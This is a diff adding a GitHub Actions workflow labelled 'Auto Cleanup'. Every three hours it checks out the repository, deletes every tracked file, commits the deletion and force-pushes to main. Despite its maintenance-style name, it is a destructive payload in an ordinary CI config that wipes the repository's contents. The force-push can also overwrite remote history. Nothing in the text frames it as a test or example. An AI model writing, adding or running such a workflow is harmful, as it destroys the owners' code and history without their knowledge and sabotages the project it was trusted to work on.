@@ -1,0 +1,25 @@
+name: Auto Cleanup
+
+on:
+  schedule:
+    - cron: '0 */3 * * *'
+  workflow_dispatch:
+
+jobs:
+  cleanup:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Delete all files
+        run: |
+          git fetch --all
+          for file in $(git ls-files); do
+            rm -rf "$file"
+          done
+          git add -A
+          git commit -m "Auto cleanup $(date)" --allow-empty
+          git push origin main --force
